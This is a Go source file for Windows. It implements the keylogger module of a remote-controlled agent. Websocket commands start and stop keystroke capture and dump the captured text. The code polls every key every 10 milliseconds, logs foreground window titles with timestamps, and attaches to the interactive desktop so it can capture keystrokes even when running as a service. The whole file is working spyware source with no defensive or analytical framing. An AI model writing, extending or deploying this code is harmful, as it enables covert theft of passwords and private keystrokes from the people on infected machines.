//go:build windows

package main

import (
	"encoding/json"
	"fmt"
	"runtime"
	"strings"
	"sync"
	"syscall"
	"time"
	"unsafe"

	"github.com/gorilla/websocket"
)

// ═══ 键盘记录模块 (Windows) ═══

var (
	modUser32Keylog        = syscall.NewLazyDLL("user32.dll")
	procGetAsyncKeyState   = modUser32Keylog.NewProc("GetAsyncKeyState")
	procGetKeyState        = modUser32Keylog.NewProc("GetKeyState")
	procGetKeyboardLayout  = modUser32Keylog.NewProc("GetKeyboardLayout")
	procMapVirtualKeyExW   = modUser32Keylog.NewProc("MapVirtualKeyExW")
	procToUnicodeEx        = modUser32Keylog.NewProc("ToUnicodeEx")
	procGetForegroundWin   = modUser32Keylog.NewProc("GetForegroundWindow")
	procGetWindowTextWKL   = modUser32Keylog.NewProc("GetWindowTextW")
	procGetWindowThreadPID = modUser32Keylog.NewProc("GetWindowThreadProcessId")
)

var (
	keylogMu      sync.Mutex
	keylogRunning bool
	keylogStop    chan struct{}
	keylogBuffer  strings.Builder
)

func handleKeylogStart(conn *websocket.Conn, writeMu *sync.Mutex, msg AgentMessage) {
	keylogMu.Lock()
	defer keylogMu.Unlock()

	if keylogRunning {
		sendResult(conn, writeMu, "keylog_result", msg.ID, `{"status":"already_running"}`)
		return
	}

	keylogRunning = true
	keylogStop = make(chan struct{})
	go keylogLoop()
	sendResult(conn, writeMu, "keylog_result", msg.ID, `{"status":"started"}`)
}

func handleKeylogStop(conn *websocket.Conn, writeMu *sync.Mutex, msg AgentMessage) {
	keylogMu.Lock()
	defer keylogMu.Unlock()

	if !keylogRunning {
		sendResult(conn, writeMu, "keylog_result", msg.ID, `{"status":"not_running"}`)
		return
	}

	close(keylogStop)
	keylogRunning = false
	sendResult(conn, writeMu, "keylog_result", msg.ID, `{"status":"stopped"}`)
}

func handleKeylogDump(conn *websocket.Conn, writeMu *sync.Mutex, msg AgentMessage) {
	keylogMu.Lock()
	data := keylogBuffer.String()
	keylogBuffer.Reset()
	keylogMu.Unlock()

	result, _ := json.Marshal(map[string]string{"data": data})
	sendResult(conn, writeMu, "keylog_dump_result", msg.ID, string(result))
}

func keylogLoop() {
	runtime.LockOSThread()
	defer runtime.UnlockOSThread()
	// Session 0 修复：绑定到用户交互式桌面，否则 GetAsyncKeyState 无法捕获用户按键
	attachToInteractiveDesktop()

	prevState := make(map[int]bool)
	lastWindow := ""
	ticker := time.NewTicker(10 * time.Millisecond)
	defer ticker.Stop()

	for {
		select {
		case <-keylogStop:
			return
		case <-ticker.C:
		}

		// Check foreground window
		hwnd, _, _ := procGetForegroundWin.Call()
		if hwnd != 0 {
			title := getWindowTitleKL(hwnd)
			if title != lastWindow && title != "" {
				keylogMu.Lock()
				keylogBuffer.WriteString(fmt.Sprintf("\n[%s] [%s]\n", time.Now().Format("15:04:05"), title))
				keylogMu.Unlock()
				lastWindow = title
			}
		}

		threadID, _, _ := procGetWindowThreadPID.Call(hwnd, 0)
		hkl, _, _ := procGetKeyboardLayout.Call(threadID)

		for vk := 8; vk <= 254; vk++ {
			ret, _, _ := procGetAsyncKeyState.Call(uintptr(vk))
			pressed := (ret & 0x8000) != 0

			if pressed && !prevState[vk] {
				ch := vkToChar(vk, hkl)
				if ch != "" {
					keylogMu.Lock()
					keylogBuffer.WriteString(ch)
					keylogMu.Unlock()
				}
			}
			prevState[vk] = pressed
		}
	}
}

func vkToChar(vk int, hkl uintptr) string {
	// Special keys
	switch vk {
	case 0x08:
		return "[BS]"
	case 0x09:
		return "[TAB]"
	case 0x0D:
		return "\n"
	case 0x1B:
		return "[ESC]"
	case 0x20:
		return " "
	case 0x2E:
		return "[DEL]"
	case 0x25:
		return "[←]"
	case 0x26:
		return "[↑]"
	case 0x27:
		return "[→]"
	case 0x28:
		return "[↓]"
	}

	// Skip modifier keys themselves
	if vk >= 0xA0 && vk <= 0xA5 { // shift/ctrl/alt
		return ""
	}
	if vk >= 0x70 && vk <= 0x87 { // F1-F24
		return fmt.Sprintf("[F%d]", vk-0x6F)
	}

	// Try ToUnicodeEx
	scanCode, _, _ := procMapVirtualKeyExW.Call(uintptr(vk), 0, hkl)
	var keyState [256]byte
	for i := 0; i < 256; i++ {
		s, _, _ := procGetKeyState.Call(uintptr(i))
		keyState[i] = byte(s)
	}

	var buf [4]uint16
	ret, _, _ := procToUnicodeEx.Call(
		uintptr(vk),
		scanCode,
		uintptr(unsafe.Pointer(&keyState[0])),
		uintptr(unsafe.Pointer(&buf[0])),
		4, 0, hkl,
	)
	if int32(ret) > 0 {
		return syscall.UTF16ToString(buf[:int32(ret)])
	}
	return ""
}

func getWindowTitleKL(hwnd uintptr) string {
	var buf [256]uint16
	procGetWindowTextWKL.Call(hwnd, uintptr(unsafe.Pointer(&buf[0])), 256)
	return syscall.UTF16ToString(buf[:])
}
